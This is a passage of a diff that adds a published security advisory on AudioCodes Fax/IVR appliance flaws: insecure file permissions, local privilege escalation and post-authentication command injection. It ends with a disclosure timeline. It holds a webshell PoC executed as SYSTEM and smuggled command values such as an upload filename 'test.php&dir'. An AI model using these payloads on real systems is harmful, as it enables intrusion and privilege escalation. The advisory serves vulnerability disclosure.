+startService.bat BUILTIN\Administrators:(I)(F)
+                 NT AUTHORITY\SYSTEM:(I)(F)
+                 BUILTIN\Users:(I)(RX)
+                 NT AUTHORITY\Authenticated Users:(I)(M)
+
+startService1.bat BUILTIN\Administrators:(I)(F)
+                  NT AUTHORITY\SYSTEM:(I)(F)
+                  BUILTIN\Users:(I)(RX)
+                  NT AUTHORITY\Authenticated Users:(I)(M)
+
+startService2.bat BUILTIN\Administrators:(I)(F)
+                  NT AUTHORITY\SYSTEM:(I)(F)
+                  BUILTIN\Users:(I)(RX)
+                  NT AUTHORITY\Authenticated Users:(I)(M)
+
+stop.bat BUILTIN\Administrators:(I)(F)
+         NT AUTHORITY\SYSTEM:(I)(F)
+         BUILTIN\Users:(I)(RX)
+         NT AUTHORITY\Authenticated Users:(I)(M)
+
+stopCommetrex.bat BUILTIN\Administrators:(I)(F)
+                  NT AUTHORITY\SYSTEM:(I)(F)
+                  BUILTIN\Users:(I)(RX)
+                  NT AUTHORITY\Authenticated Users:(I)(M)
+
+stopService.bat BUILTIN\Administrators:(I)(F)
+                NT AUTHORITY\SYSTEM:(I)(F)
+                BUILTIN\Users:(I)(RX)
+                NT AUTHORITY\Authenticated Users:(I)(M)
+
+stopService1.bat BUILTIN\Administrators:(I)(F)
+                 NT AUTHORITY\SYSTEM:(I)(F)
+                 BUILTIN\Users:(I)(RX)
+                 NT AUTHORITY\Authenticated Users:(I)(M)
+
+stopService2.bat BUILTIN\Administrators:(I)(F)
+                 NT AUTHORITY\SYSTEM:(I)(F)
+                 BUILTIN\Users:(I)(RX)
+                 NT AUTHORITY\Authenticated Users:(I)(M)
+
+y.txt BUILTIN\Administrators:(I)(F)
+      NT AUTHORITY\SYSTEM:(I)(F)
+      BUILTIN\Users:(I)(RX)
+      NT AUTHORITY\Authenticated Users:(I)(M)
+
+Successfully processed 19 files; Failed processing 0 files
+</code></pre>
+<p><a id="lpe-02"></a></p>
+<h2>Details - Local Privilege Escalation #2</h2>
+<p>The <code>DocumentRoot</code> directory <code>C:\F2MAdmin\F2E</code> can be modified by any user due to insecure permissions.</p>
+<p>PoC - a webshell will be executed as <code>NT AUTHORITY\SYSTEM</code>: </p>
+<pre><code>Microsoft Windows [Version 10.0.19043.928]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser&gt;whoami
+desktop-to41lr8\testuser
+
+C:\Users\testuser&gt;icacls C:\F2MAdmin\F2E
+C:\F2MAdmin\F2E BUILTIN\Administrators:(I)(OI)(CI)(F)
+                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                BUILTIN\Users:(I)(OI)(CI)(RX)
+                NT AUTHORITY\Authenticated Users:(I)(M)
+                NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\testuser&gt;echo "&lt;?php system('whoami');?&gt;" &gt; C:\F2MAdmin\F2E\a.php
+
+C:\Users\testuser&gt;curl http://127.0.0.1:8090/a.php
+"nt authority\system
+"
+
+C:\Users\testuser&gt;
+</code></pre>
+<p>I haven't performed a comprehensive analysis, but additional Local Privilege Escalation vulnerabilities likely exist.</p>
+<p><a id="rce-03"></a></p>
+<h2>Details - Post-authenticated Command Injection and Local Privilege Escalation</h2>
+<p>In order to test the Fax configurattion, a batch file with attacker-controlled value will be created and then executed. Variables are not sanitized and can be used to execute additional malicious commands.</p>
+<p>Content of <code>C:\F2E\AudioCodes_files\TestFax.php</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
+[<span style="color: #666666">...</span>]
+ <span style="color: #666666">10</span> <span style="color: #19177C">$FromNumber</span> <span style="color: #666666">=</span> <span style="color: #008000">isset</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;FromNumber&quot;</span>]) <span style="color: #666666">?</span> <span style="color: #008000">trim</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;FromNumber&quot;</span>]) <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&#39;</span>;
+ <span style="color: #666666">11</span> <span style="color: #19177C">$ToNumber</span> <span style="color: #666666">=</span> <span style="color: #008000">isset</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;ToNumber&quot;</span>]) <span style="color: #666666">?</span> <span style="color: #008000">trim</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;ToNumber&quot;</span>]) <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&#39;</span>;
+ <span style="color: #666666">12</span> <span style="color: #19177C">$src_ip</span> <span style="color: #666666">=</span> <span style="color: #008000">isset</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;src_ip&quot;</span>]) <span style="color: #666666">?</span> <span style="color: #008000">trim</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;src_ip&quot;</span>]) <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&#39;</span>;
+ <span style="color: #666666">13</span> <span style="color: #19177C">$action</span> <span style="color: #666666">=</span> <span style="color: #008000">isset</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;action&quot;</span>]) <span style="color: #666666">?</span> <span style="color: #008000">trim</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;action&quot;</span>]) <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&#39;</span>;
+[<span style="color: #666666">...</span>]
+ <span style="color: #666666">32</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000">strcmp</span>(<span style="color: #19177C">$action</span>,<span style="color: #BA2121">&quot;send&quot;</span>)<span style="color: #666666">==0</span>)
+ <span style="color: #666666">33</span> {
+ <span style="color: #666666">34</span>         <span style="color: #008000; font-weight: bold">require_once</span> <span style="color: #BA2121">&#39;utils/Global/GlobalUtils.class.php&#39;</span>;
+ <span style="color: #666666">35</span>
+ <span style="color: #666666">36</span>         <span style="color: #19177C">$command</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;C:</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">progra~2</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">Commetrex</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">otf</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">bin</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">faxsender -u sip:</span><span style="color: #BB6688; font-weight: bold">$ToNumber</span><span style="color: #BA2121">@</span><span style="color: #BB6688; font-weight: bold">$src_ip</span><span style="color: #BA2121"> -f test_web_fax.tif -o mulaw -a T38 -c sip:</span><span style="color: #BB6688; font-weight: bold">$FromNumber</span><span style="color: #BA2121">@</span><span style="color: #BB6688; font-weight: bold">$src_ip</span><span style="color: #BA2121"> -t&quot;</span>;
+ <span style="color: #666666">37</span>         GlobalUtils<span style="color: #666666">::</span><span style="color: #7D9029">RunBatchFile</span>(<span style="color: #19177C">$command</span>);
+</pre></div>
+
+<p>The batch file containing the command will be written inside the <code>C:\F2MAdmin\run</code> directory and then executed by accessing a network service without authentication:</p>
+<p><code>http://localhost:9437/f2mw-service-api/?method=runBatch&amp;fileName=tmp_1754486471_37.bat</code></p>
+<p>An authenticated attacker can use variables containing malicious commands with <code>&amp;</code> or newline characters - the additional commands will be executed as <code>NT AUTHORITY\system</code>.</p>
+<p>A local user can simply edit these files to inject malicious commands due to insecure permissions.</p>
+<p><a id="rce-04"></a></p>
+<h2>Details - Post-authenticated Command Injection</h2>
+<p>The <code>C:\F2MAdmin\F2E\AudioCodes_files\ActivateLicense.php</code> PHP script allows to upload a license file.</p>
+<p>When a license file containing a specific malicious extension is uploaded, this extension will be included in a command executed as <code>NT AUTHORITY\system</code>. There is no sanitization, so an attacker can upload <code>test.ext&amp;command_to_execute</code> to execute <code>command_to_execute</code> as <code>NT AUTHORITY\system</code>:</p>
+<p>The execution flow is:</p>
+<pre><code>$original_file (under the attacker's control, this is the name of the uploaded file) -&gt; $ext -&gt; $newfile -&gt; $target_path -&gt; $params and then exec($params).
+</code></pre>
+<p>Content of <code>C:\F2MAdmin\F2E\AudioCodes_files\ActivateLicense.php</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
+<span style="color: #666666">104</span> <span style="color: #19177C">$c2vdir</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;C:/temp/&quot;</span>;
+[<span style="color: #666666">...</span>]
+<span style="color: #666666">242</span>         <span style="color: #19177C">$utime</span><span style="color: #666666">=</span><span style="color: #008000">time</span>();
+<span style="color: #666666">243</span> 
+<span style="color: #666666">244</span>         <span style="color: #19177C">$uday</span><span style="color: #666666">=</span> <span style="color: #008000">date</span>(<span style="color: #BA2121">&#39;d&#39;</span>);
+<span style="color: #666666">245</span>         <span style="color: #19177C">$umonth</span><span style="color: #666666">=</span> <span style="color: #008000">date</span>(<span style="color: #BA2121">&#39;m&#39;</span>);
+<span style="color: #666666">246</span>         <span style="color: #19177C">$uyear</span><span style="color: #666666">=</span> <span style="color: #008000">date</span>(<span style="color: #BA2121">&#39;y&#39;</span>);
+<span style="color: #666666">247</span> 
+<span style="color: #666666">248</span>         <span style="color: #19177C">$udate</span><span style="color: #666666">=</span><span style="color: #19177C">$umonth</span><span style="color: #666666">.</span><span style="color: #19177C">$uday</span><span style="color: #666666">.</span><span style="color: #19177C">$uyear</span>;
+<span style="color: #666666">249</span> 
+<span style="color: #666666">250</span>         <span style="color: #19177C">$filename</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;a&quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$udate</span><span style="color: #666666">.</span><span style="color: #19177C">$utime</span>;
+<span style="color: #666666">251</span> 
+<span style="color: #666666">252</span>         
+<span style="color: #666666">253</span>         <span style="color: #19177C">$target_path</span> <span style="color: #666666">=</span> <span style="color: #19177C">$c2vdir</span>; 
+[<span style="color: #666666">...</span>]
+<span style="color: #666666">257</span>         <span style="color: #19177C">$original_file</span> <span style="color: #666666">=</span> <span style="color: #008000">basename</span>(<span style="color: #19177C">$_FILES</span>[<span style="color: #BA2121">&#39;uploadedfile&#39;</span>][<span style="color: #BA2121">&#39;name&#39;</span>]);
+<span style="color: #666666">258</span> 
+<span style="color: #666666">259</span>         <span style="color: #19177C">$pos</span> <span style="color: #666666">=</span> <span style="color: #008000">strpos</span>(<span style="color: #19177C">$original_file</span>,<span style="color: #BA2121">&quot;.&quot;</span>,<span style="color: #666666">0</span>);
+<span style="color: #666666">260</span>         <span style="color: #19177C">$ext</span> <span style="color: #666666">=</span> <span style="color: #008000">trim</span>(<span style="color: #008000">substr</span>(<span style="color: #19177C">$original_file</span>,<span style="color: #19177C">$pos</span><span style="color: #666666">+1</span>,<span style="color: #008000">strlen</span>(<span style="color: #19177C">$original_file</span>)),<span style="color: #BA2121">&quot; &quot;</span>);
+<span style="color: #666666">261</span> 
+<span style="color: #666666">262</span>         <span style="color: #19177C">$newfile</span> <span style="color: #666666">=</span> <span style="color: #19177C">$filename</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;.&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$ext</span>;
+<span style="color: #666666">263</span> 
+<span style="color: #666666">264</span>         <span style="color: #19177C">$target_path</span> <span style="color: #666666">=</span> <span style="color: #19177C">$target_path</span> <span style="color: #666666">.</span> <span style="color: #008000">basename</span>(<span style="color: #19177C">$newfile</span>);
+[<span style="color: #666666">...</span>]
+<span style="color: #666666">269</span>                 <span style="color: #19177C">$params</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;--active -i &quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$target_path</span>;
+<span style="color: #666666">270</span>                 <span style="color: #19177C">$res</span> <span style="color: #666666">=</span> <span style="color: #008000">exec</span> (<span style="color: #BA2121">&quot;C:</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">F2MAdmin</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">F2E</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">external</span><span style="color: #BB6622; font-weight: bold">\\</span><span style="color: #BA2121">fax_server_lic_cmdline.exe &quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$params</span>,<span style="color: #19177C">$resArr</span>);
+</pre></div>
+
+<p>The generated filename is made of 'a', the MMDDYY values, the current Unix time and the extension.</p>
+<p>For example, if the filename used during the upload (<code>$_FILES['uploadedfile']['name']</code>) is set to <code>test.php&amp;dir</code>, the <code>$params</code> variable will be set to <code>--active -i C:/temp/a0917251758121909.php&amp;dir</code>.</p>
+<p><code>dir</code> will be executed as <code>NT AUTHORITY\system</code> on line 270.</p>
+<p><a id="timeline"></a></p>
+<h2>Report Timeline</h2>
+<ul>
+<li>May 26 - 27, 2025: Security assessment performed on the AudioCodes IVR/FAX appliance.</li>
+<li>May 28, 2025: Analysis sent to the AudioCodes PSIRT (vulnerabilities #1 to #3).</li>
+<li>May 28, 2025: Analysis sent to the AudioCodes PSIRT (vulnerability #4).</li>
+<li>May 29, 2025: Follow-up email sent to AudioCodes PSIRT.</li>
+<li>May 29, 2025: AudioCodes PSIRT confirmed receipt of the analysis.</li>
+<li>Jun, 13 2025: Follow-up email sent to AudioCodes PSIRT.</li>
+<li>Jun, 13 2025: Out-of-office reply from the AudioCodes PSIRT.</li>
+<li>Jul, 1 2025: Follow-up email sent to AudioCodes PSIRT. Asked details about patches, security bulletins and CVEs.</li>
+<li>Jul 8, 2025: I learned that AudioCodes had released an unofficial version with security patches.</li>
+<li>Jul 8, 2025: Confirmed that vulnerabilities were still present and new vulnerabilities were found.</li>
+<li>Sep, 16 2025: Follow-up email sent to AudioCodes PSIRT. Asked details about patches, security bulletins and CVEs.</li>
+<li>Sep, 16 2025: AudioCodes PSIRT indicated that their answer was already communicated on June 25.</li>
+<li>Sep, 17 2025: Follow-up email sent to AudioCodes PSIRT stating that I did not receive any answer, CVEs or working patches. I requested an official response regarding the vulnerabilities.</li>
+<li>Sep, 17, 2025: AudioCodes PSIRT forwarded my email to two AudioCodes employees and asked them to assist me.</li>
+<li>Nov 19, 2025: Vulncheck assigned CVEs.</li>
+<li>Nov 20, 2025: A security advisory is published.</li>
+</ul>
+<h2>Credits</h2>
+<p>These vulnerabilities were found by Pierre Barre aka Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
+<h2>References</h2>
+<p><a href="https://pierrekim.github.io/blog/2025-11-20-audiocodes-fax-ivr-8-vulnerabilities.html">https://pierrekim.github.io/blog/2025-11-20-audiocodes-fax-ivr-8-vulnerabilities.html</a></p>
+<p><a href="https://pierrekim.github.io/advisories/2025-audiocodes-fax-ivr.txt">https://pierrekim.github.io/advisories/2025-audiocodes-fax-ivr.txt</a></p>
+<h2>Disclaimer</h2>
+<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p>
+<p>The source code snippets in this security advisory are the intellectual property of Audiocodes and
+used to explain the root causes of the vulnerabilities.</p>
+    <div>
+        <p class="text-muted">published on 2025-11-20 00:00:00 by Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</p>
+    </div>
+</div>
+
+</div>
+</body>
+</html>
